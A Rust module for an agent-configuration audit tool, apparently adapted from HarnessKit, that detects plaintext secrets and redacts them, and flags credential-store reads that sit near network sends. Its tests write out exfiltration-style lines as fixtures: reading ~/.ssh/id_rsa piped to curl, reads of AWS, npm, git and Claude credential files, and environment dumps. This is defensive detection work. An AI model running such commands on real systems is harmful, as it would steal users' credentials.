// Ported from HarnessKit (crates/hk-core/src/auditor/rules/content.rs, `CredentialTheft` and
// `PlaintextSecrets`, commit 9098728d22fd5c2ea6fb4864da19183b55cb33c4, Apache-2.0).
// Modified: the token families are extended (GitHub gho/ghs/ghu/github_pat, Slack, Anthropic,
// OpenAI, AWS, Google, Stripe, JWTs, PEM private keys, `user:pass@` URLs) and matched anywhere in
// a line (bare, `KEY=...`, quoted, `Bearer ...`), not only at the start of a whitespace token;
// settings and MCP `env`/`headers` values are checked by key name through the shared
// `literal_secret` detector; fenced code is scanned (HarnessKit skipped descriptive lines); the
// credential targets are extended (gh, npm, docker, kube, git credentials, Claude credentials,
// keychain tools, environment dumps); the read/send pairing is by line distance (20 lines) per
// file and gives severity per finding; evidence is rebuilt with every secret replaced by
// `<redacted>`.

//! Rules `plaintext-secrets` and `credential-theft`.
//!
//! No finding of this module carries a secret value: shape matches are cut out of the evidence
//! before it is built, and key-based matches report the key name only.

use std::sync::LazyLock;

use regex::Regex;
use serde_json::Value;

use crate::artifact::literal_secret::{is_literal_secret, REDACTED};
use crate::audit::input::{InputFile, Line};
use crate::audit::protect::{analyze, names_credential, SEND_RES};
use crate::audit::{excerpt, AuditInput, AuditRule, Finding, Severity};

const EVIDENCE_CHARS: usize = 160;
/// A credential read and a network send closer than this (in lines) make the finding critical.
const NEAR_LINES: u32 = 20;

/// Secret shapes: (family, regex). Each match is cut out of the evidence and reported once per
/// line and family.
const SHAPES: [(&str, &str); 11] = [
    ("GitHub token", r"\bgh[pousr]_[A-Za-z0-9]{30,}"),
    ("GitHub token", r"\bgithub_pat_[A-Za-z0-9_]{22,}"),
    ("Slack token", r"\bxox[abposr]-[A-Za-z0-9\-]{10,}"),
    ("Anthropic key", r"\bsk-ant-[A-Za-z0-9_\-]{20,}"),
    ("OpenAI key", r"\bsk-(?:proj-|svcacct-)?[A-Za-z0-9_\-]{20,}"),
    ("AWS access key id", r"\b(?:AKIA|ASIA)[A-Z0-9]{16}\b"),
    ("Google API key", r"\bAIza[A-Za-z0-9_\-]{35}"),
    ("Stripe key", r"\b[sr]k_live_[A-Za-z0-9]{16,}"),
    (
        "JWT",
        r"\beyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}",
    ),
    ("PEM private key", r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
    ("Bearer token", r"(?i)\bbearer\s+[A-Za-z0-9._~+/=\-]{20,}"),
];

/// `://user:password@host`: the password is the secret.
const URL_USERINFO: &str = r"://[^\s/@:]+:([^\s/@]+)@";

/// `[export] NAME=value` in scripts and settings commands.
const ASSIGNMENT: &str = r#"\b(?:export\s+)?([A-Za-z][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|[^\s"';&|]+)"#;

static SHAPE_RES: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
    SHAPES
        .iter()
        .filter_map(|(family, p)| Regex::new(p).ok().map(|r| (*family, r)))
        .collect()
});
static URL_RE: LazyLock<Option<Regex>> = LazyLock::new(|| Regex::new(URL_USERINFO).ok());
static ASSIGN_RE: LazyLock<Option<Regex>> = LazyLock::new(|| Regex::new(ASSIGNMENT).ok());

/// Passwords that are obviously documentation placeholders.
const PLACEHOLDER_WORDS: [&str; 11] = [
    "pass",
    "password",
    "passwd",
    "secret",
    "token",
    "user",
    "changeme",
    "example",
    "redacted",
    "<redacted>",
    "yourpassword",
];

/// A secret found in a line: the family and the byte range of the secret value.
struct Hit {
    family: &'static str,
    start: usize,
    end: usize,
}

/// Every secret shape in `line`.
fn shape_hits(line: &str) -> Vec<Hit> {
    let mut hits = Vec::new();
    for (family, re) in SHAPE_RES.iter() {
        for m in re.find_iter(line) {
            // A bearer value that is a placeholder or a plain word is not a token.
            if *family == "Bearer token" && !bearer_is_token(m.as_str()) {
                continue;
            }
            hits.push(Hit {
                family,
                start: m.start(),
                end: m.end(),
            });
        }
    }
    if let Some(re) = URL_RE.as_ref() {
        for caps in re.captures_iter(line) {
            if let Some(pw) = caps.get(1) {
                if !password_is_placeholder(pw.as_str()) {
                    hits.push(Hit {
                        family: "Password in a URL",
                        start: pw.start(),
                        end: pw.end(),
                    });
                }
            }
        }
    }
    hits
}

fn bearer_is_token(matched: &str) -> bool {
    let token = matched.split_whitespace().last().unwrap_or("");
    !token.starts_with(['$', '{', '<']) && token.chars().any(|c| c.is_ascii_digit())
}

fn password_is_placeholder(pw: &str) -> bool {
    let lower = pw.to_ascii_lowercase();
    pw.starts_with(['$', '{', '<', '%', '*'])
        || PLACEHOLDER_WORDS.contains(&lower.as_str())
        || lower.chars().all(|c| c == 'x' || c == '*' || c == '.')
}

/// `line` with each hit replaced by `<redacted>`, then the shared redaction and excerpt.
fn masked_evidence(line: &str, hits: &[Hit]) -> String {
    let mut ranges: Vec<(usize, usize)> = hits.iter().map(|h| (h.start, h.end)).collect();
    ranges.sort_unstable();
    let mut out = String::new();
    let mut at = 0;
    for (start, end) in ranges {
        if end <= at {
            continue;
        }
        if start > at {
            out.push_str(&line[at..start]);
        }
        out.push_str(REDACTED);
        at = end;
    }
    out.push_str(&line[at..]);
    excerpt(&flatten(&out), EVIDENCE_CHARS)
}

fn flatten(text: &str) -> String {
    text.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Literal credentials in any file: token shapes, secrets in URLs, secret-named assignments in
/// scripts, and literal `env` / `headers` values of Settings and MCP definitions. A redacted
/// value in an MCP definition means the scan already found a literal secret there (the
/// definition is built from scan metadata, where such values are replaced by `<redacted>`), so
/// it is reported with the key name and `<redacted>` as evidence.
pub(crate) struct PlaintextSecrets;

impl AuditRule for PlaintextSecrets {
    fn id(&self) -> &'static str {
        "plaintext-secrets"
    }

    fn severity(&self) -> Severity {
        Severity::Critical
    }

    fn check(&self, input: &AuditInput) -> Vec<Finding> {
        let mut out = Vec::new();
        for file in &input.files {
            let before = out.len();
            self.scan_lines(file, &mut out);
            if file.is_settings() || file.is_mcp_definition() {
                self.scan_structured(file, before, &mut out);
            }
        }
        out
    }
}

impl PlaintextSecrets {
    fn finding(
        &self,
        file: &InputFile,
        line: Option<u32>,
        what: &str,
        evidence: String,
    ) -> Finding {
        Finding {
            rule: self.id().into(),
            severity: self.severity(),
            message: format!("Plaintext secret: {what}"),
            file: file.path.clone(),
            line,
            evidence,
        }
    }

    fn scan_lines(&self, file: &InputFile, out: &mut Vec<Finding>) {
        let assignments = !file.is_markdown() && !file.is_mcp_definition();
        for line in file.lines() {
            let mut hits = shape_hits(line.text);
            let mut families: Vec<&'static str> = Vec::new();
            for h in &hits {
                if !families.contains(&h.family) {
                    families.push(h.family);
                }
            }
            if assignments {
                for (start, end) in literal_assignments(line.text) {
                    families.push("literal value in a secret-named variable");
                    hits.push(Hit {
                        family: "assignment",
                        start,
                        end,
                    });
                }
            }
            if families.is_empty() {
                continue;
            }
            let evidence = masked_evidence(line.text, &hits);
            out.push(self.finding(file, Some(line.number), &families.join(", "), evidence));
        }
    }

    /// `env` and `headers` maps of a Settings or MCP JSON file, by key name. Lines that already
    /// have a finding are not reported twice.
    fn scan_structured(&self, file: &InputFile, from: usize, out: &mut Vec<Finding>) {
        let Ok(value) = serde_json::from_str::<Value>(&file.text) else {
            return;
        };
        let mut found: Vec<(String, bool)> = Vec::new();
        collect_secret_entries(&value, &mut found);
        for (key, marker) in found {
            let line = secret_line(file, &key, marker);
            if line.is_some() && out[from..].iter().any(|f| f.line == line) {
                continue;
            }
            out.push(self.finding(
                file,
                line,
                &format!("`{key}` holds a literal value"),
                format!("\"{key}\": \"{REDACTED}\""),
            ));
        }
    }
}

/// `(value start, value end)` of every secret-named assignment with a literal value.
fn literal_assignments(line: &str) -> Vec<(usize, usize)> {
    let Some(re) = ASSIGN_RE.as_ref() else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for caps in re.captures_iter(line) {
        let (Some(name), Some(val)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let inner = val.as_str().trim_matches(|c| c == '"' || c == '\'');
        if closes_open_string(line, val.start(), val.as_str()) || looks_like_expression(inner) {
            continue;
        }
        if inner.len() < 8
            || inner.starts_with(['$', '`', '<', '{', '%', '@', '/', '~', '.', '(', '\\'])
            || looks_like_example(inner)
            || !is_literal_secret(name.as_str(), inner)
        {
            continue;
        }
        out.push((val.start(), val.end()));
    }
    out
}

/// The value's opening quote closes a string that began earlier on the line
/// (`'...?token=' + TOKEN + '...'`): the "value" is code between two literals.
fn closes_open_string(line: &str, start: usize, value: &str) -> bool {
    let Some(quote) = value.chars().next().filter(|c| matches!(c, '"' | '\'')) else {
        return false;
    };
    line[..start].matches(quote).count() % 2 == 1
}

/// Code, not a literal: concatenation, interpolation or a call.
fn looks_like_expression(value: &str) -> bool {
    value.contains(" + ")
        || value.contains("${")
        || value
            .find('(')
            .is_some_and(|i| value[..i].ends_with(|c: char| c.is_alphanumeric() || c == '_'))
}

fn looks_like_example(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    [
        "your",
        "example",
        "changeme",
        "placeholder",
        "xxx",
        "...",
        "dummy",
    ]
    .iter()
    .any(|w| lower.contains(w))
}

/// `(key, is the redaction marker)` of the literal entries in every `env` / `headers` object.
fn collect_secret_entries(value: &Value, out: &mut Vec<(String, bool)>) {
    match value {
        Value::Object(map) => {
            for (name, child) in map {
                if matches!(name.as_str(), "env" | "headers") {
                    if let Value::Object(entries) = child {
                        for (key, v) in entries {
                            let Some(s) = v.as_str() else { continue };
                            if s.trim() == REDACTED {
                                out.push((key.clone(), true));
                            } else if is_literal_header_or_env(key, s) {
                                out.push((key.clone(), false));
                            }
                        }
                    }
                }
                collect_secret_entries(child, out);
            }
        }
        Value::Array(items) => items.iter().for_each(|v| collect_secret_entries(v, out)),
        _ => {}
    }
}

/// The shared check, after dropping an auth scheme and treating `${VAR}` inside as a placeholder.
fn is_literal_header_or_env(key: &str, value: &str) -> bool {
    let value = value.trim();
    if value.contains("${") {
        return false;
    }
    let token = ["Bearer ", "Basic ", "Token "]
        .iter()
        .find_map(|scheme| {
            value
                .get(..scheme.len())
                .filter(|p| p.eq_ignore_ascii_case(scheme))
                .map(|_| value[scheme.len()..].trim())
        })
        .unwrap_or(value);
    is_literal_secret(key, token)
}

/// The line of `"key"` (with the redaction marker when that is what was found).
fn secret_line(file: &InputFile, key: &str, marker: bool) -> Option<u32> {
    let needle = format!("\"{key}\"");
    let hit = |l: &Line<'_>| l.text.contains(&needle) && (!marker || l.text.contains(REDACTED));
    file.lines().find(hit).map(|l| l.number)
}

// --- credential-theft ---

/// A read of a credential store or an environment dump. Critical when a network send is within
/// 20 lines in the same file, else high (the reference itself is still worth a look).
pub(crate) struct CredentialTheft;

impl AuditRule for CredentialTheft {
    fn id(&self) -> &'static str {
        "credential-theft"
    }

    fn severity(&self) -> Severity {
        Severity::Critical
    }

    fn check(&self, input: &AuditInput) -> Vec<Finding> {
        let mut out = Vec::new();
        for file in &input.files {
            let protected = analyze(file).lines;
            let mut reads: Vec<(u32, &str)> = Vec::new();
            let mut sends: Vec<u32> = Vec::new();
            for line in file.lines() {
                if names_credential(line.text) && !protected.contains(&line.number) {
                    reads.push((line.number, line.text));
                }
                if SEND_RES.iter().any(|r| r.is_match(line.text)) {
                    sends.push(line.number);
                }
            }
            for (number, text) in reads {
                let near = sends.iter().any(|s| s.abs_diff(number) <= NEAR_LINES);
                let (severity, message) = if near {
                    (
                        Severity::Critical,
                        "Reads credentials and sends data over the network within 20 lines",
                    )
                } else {
                    (
                        Severity::High,
                        "References credential files or dumps the environment",
                    )
                };
                out.push(Finding {
                    rule: self.id().into(),
                    severity,
                    message: message.into(),
                    file: file.path.clone(),
                    line: Some(number),
                    evidence: masked_evidence(text, &shape_hits(text)),
                });
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::artifact::ArtifactKind;

    const TAIL: &str = "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8";

    /// Fixture secrets, built at run time from fragments.
    fn families() -> Vec<(&'static str, String)> {
        vec![
            ("gh", ["gh", "p_", TAIL].concat()),
            ("gho", ["gh", "o_", TAIL].concat()),
            ("ghs", ["gh", "s_", TAIL].concat()),
            ("ghu", ["gh", "u_", TAIL].concat()),
            ("pat", ["github_", "pat_", TAIL, "ZZ"].concat()),
            ("slack", ["xo", "xb-", "1234567890-", TAIL].concat()),
            ("anthropic", ["sk", "-ant-", TAIL].concat()),
            ("openai", ["sk", "-", TAIL].concat()),
            ("aws", ["AK", "IA", "ABCDEFGHIJKLMNOP"].concat()),
            ("google", ["AI", "za", &"B".repeat(35)].concat()),
            ("stripe", ["sk", "_live_", TAIL].concat()),
            (
                "jwt",
                [
                    "ey",
                    "Jhbgci0iJIUz",
                    ".",
                    "eyJzdWIiOiIx",
                    ".",
                    "abcdefghijk",
                ]
                .concat(),
            ),
            ("pem", ["-----BEGIN ", "RSA PRIVATE", " KEY-----"].concat()),
        ]
    }

    fn input(kind: ArtifactKind, path: &str, text: &str) -> AuditInput {
        AuditInput::with_files(kind, "t", path, &[(path, text)])
    }

    fn check_all(input: &AuditInput) -> Vec<Finding> {
        let mut f = PlaintextSecrets.check(input);
        f.extend(CredentialTheft.check(input));
        f
    }

    fn secrets(text: &str, path: &str, kind: ArtifactKind) -> Vec<Finding> {
        PlaintextSecrets.check(&input(kind, path, text))
    }

    #[test]
    fn every_family_in_every_context_is_found_and_never_echoed() {
        for (name, secret) in families() {
            let contexts = [
                secret.clone(),
                format!("export API_VALUE={secret}"),
                format!("token = \"{secret}\""),
                format!("Authorization: Bearer {secret}"),
            ];
            for (i, line) in contexts.iter().enumerate() {
                // A Bearer wrapper only applies to token-like values; the shape still matches.
                let found = secrets(
                    &format!("intro\n{line}\n"),
                    "scripts/run.sh",
                    ArtifactKind::Skill,
                );
                assert_eq!(found.len(), 1, "{name} context {i}");
                assert_eq!(found[0].line, Some(2), "{name} context {i}");
                assert_eq!(found[0].severity, Severity::Critical);
                let json = serde_json::to_string(&found).unwrap_or_default();
                assert!(!json.contains(&secret), "{name} context {i}: {json}");
                assert!(json.contains(REDACTED), "{name} context {i}");
            }
        }
    }

    #[test]
    fn password_in_a_url_is_found_and_hidden_but_placeholders_are_not() {
        let url = ["https://deploy:", "hunter2hunter2", "@example.com/repo"].concat();
        let found = secrets(&url, "a.sh", ArtifactKind::Skill);
        assert_eq!(found.len(), 1);
        let json = serde_json::to_string(&found).unwrap_or_default();
        assert!(!json.contains("hunter2"));
        for ok in [
            "https://user:${DEPLOY_PASSWORD}@example.com/x",
            "https://user:$PASS@example.com/x",
            "https://user:password@example.com/x",
            "https://example.com/a",
        ] {
            assert!(secrets(ok, "a.sh", ArtifactKind::Skill).is_empty(), "{ok}");
        }
    }

    #[test]
    fn variables_and_plain_text_are_not_secrets() {
        let text = "export GITHUB_TOKEN=${GITHUB_TOKEN}\nAuthorization: Bearer $TOKEN\n\
                    run the sk-learn tests\nAPI_KEY=$(cat key.txt)\nAPI_KEY=your-key-here\n\
                    SSH_KEY_PATH=/home/me/key\nBearer token is sent in a header";
        assert!(secrets(text, "a.sh", ArtifactKind::Skill).is_empty());
    }

    #[test]
    fn secret_named_assignment_in_a_script_is_found_without_a_token_shape() {
        let text = "export DB_PASSWORD=correct-horse-battery\n";
        let found = secrets(text, "a.sh", ArtifactKind::Skill);
        assert_eq!(found.len(), 1);
        let json = serde_json::to_string(&found).unwrap_or_default();
        assert!(!json.contains("correct-horse"));
        // The same line in prose is not a finding.
        assert!(secrets(text, "SKILL.md", ArtifactKind::Skill).is_empty());
    }

    #[test]
    fn url_query_keys_in_code_are_not_assignments() {
        let text = "const u = 'http://localhost:' + PORT + '/manual-edit-stash?token=' + TOKEN + '&pageUrl=' + encodeURIComponent(href);\n\
                    fetch(`/x?token=${TOKEN}&a=1`);\n";
        assert!(secrets(text, "live-browser.js", ArtifactKind::Skill).is_empty());
    }

    #[test]
    fn literal_secrets_in_urls_and_assignments_stay_found() {
        let token = ["gh", "p_", TAIL].concat();
        let url = format!("const u = 'https://x.dev/api?token={token}';\n");
        assert_eq!(secrets(&url, "a.js", ArtifactKind::Skill).len(), 1);
        let assign = "API_TOKEN=\"s3cr3t-value-123\"\n";
        assert_eq!(secrets(assign, "a.sh", ArtifactKind::Skill).len(), 1);
    }

    #[test]
    fn fenced_code_in_markdown_is_scanned() {
        let secret = ["gh", "p_", TAIL].concat();
        let text = format!("# Setup\n```\nexport X={secret}\n```\n");
        let found = secrets(&text, "SKILL.md", ArtifactKind::Skill);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, Some(3));
    }

    #[test]
    fn settings_env_literals_are_found_by_key_and_placeholders_are_not() {
        let text = "{\n  \"env\": {\n    \"SERVICE_TOKEN\": \"harneo-literal-value-1\",\n    \"OTHER_TOKEN\": \"${OTHER_TOKEN}\",\n    \"LOG_LEVEL\": \"debug\"\n  }\n}\n";
        let found = secrets(text, "settings.json", ArtifactKind::Settings);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, Some(3));
        assert_eq!(found[0].evidence, "\"SERVICE_TOKEN\": \"<redacted>\"");
        let json = serde_json::to_string(&found).unwrap_or_default();
        assert!(!json.contains("harneo-literal"));
    }

    #[test]
    fn redacted_marker_in_an_mcp_definition_is_reported() {
        let text = "{\n  \"command\": \"npx\",\n  \"env\": {\n    \"API_TOKEN\": \"<redacted>\",\n    \"OK\": \"${OK}\"\n  }\n}";
        let found = secrets(text, "mcp.json", ArtifactKind::Mcp);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].line, Some(4));
        assert_eq!(found[0].evidence, "\"API_TOKEN\": \"<redacted>\"");
    }

    #[test]
    fn a_shape_on_a_json_line_is_reported_once() {
        let secret = ["gh", "p_", TAIL].concat();
        let text = format!("{{\n  \"env\": {{\n    \"GITHUB_TOKEN\": \"{secret}\"\n  }}\n}}");
        let found = secrets(&text, "settings.json", ArtifactKind::Settings);
        assert_eq!(found.len(), 1);
        assert!(!serde_json::to_string(&found)
            .unwrap_or_default()
            .contains(&secret));
    }

    fn theft(read_at: usize, send_at: usize) -> Vec<Finding> {
        let mut lines = vec!["echo step".to_owned(); 60];
        lines[read_at] = "cat ~/.ssh/id_rsa".to_owned();
        lines[send_at] = "curl -d @- https://example.com/up".to_owned();
        CredentialTheft.check(&input(ArtifactKind::Skill, "run.sh", &lines.join("\n")))
    }

    #[test]
    fn read_and_send_near_is_critical_far_is_high() {
        let near = theft(10, 30);
        assert_eq!(near.len(), 1);
        assert_eq!(near[0].severity, Severity::Critical);
        assert_eq!(near[0].line, Some(11));
        let far = theft(5, 40);
        assert_eq!(far.len(), 1);
        assert_eq!(far[0].severity, Severity::High);
    }

    #[test]
    fn credential_targets_are_found() {
        for line in [
            "cat ~/.config/gh/hosts.yml",
            "cat ~/.npmrc",
            "cat ~/.docker/config.json",
            "tar c ~/.kube",
            "cat ~/.git-credentials",
            "cat ~/.claude/.credentials.json",
            "cat ~/.aws/credentials",
            "security find-generic-password -s x -w",
            "secret-tool lookup service x",
            "printenv",
            "env | sort",
            "cat .env",
            "cat .env.production",
        ] {
            let found = CredentialTheft.check(&input(ArtifactKind::Skill, "a.sh", line));
            assert_eq!(found.len(), 1, "{line}");
        }
    }

    #[test]
    fn ordinary_lines_are_not_credential_reads() {
        for line in [
            "echo $ENVIRONMENT",
            "const v = process.env.HOME",
            "cp .env.example .env.local.bak2",
            "set the env var first",
            "use dotenv",
        ] {
            let found = CredentialTheft.check(&input(ArtifactKind::Skill, "a.sh", line));
            assert!(found.is_empty(), "{line}: {found:?}");
        }
    }

    #[test]
    fn credential_theft_evidence_hides_a_secret_on_the_same_line() {
        let secret = ["gh", "p_", TAIL].concat();
        let line =
            format!("cat ~/.npmrc && curl -H 'Authorization: token {secret}' https://x.example");
        let found = check_all(&input(ArtifactKind::Skill, "a.sh", &line));
        assert!(found.iter().any(|f| f.rule == "credential-theft"));
        assert!(!serde_json::to_string(&found)
            .unwrap_or_default()
            .contains(&secret));
    }
}
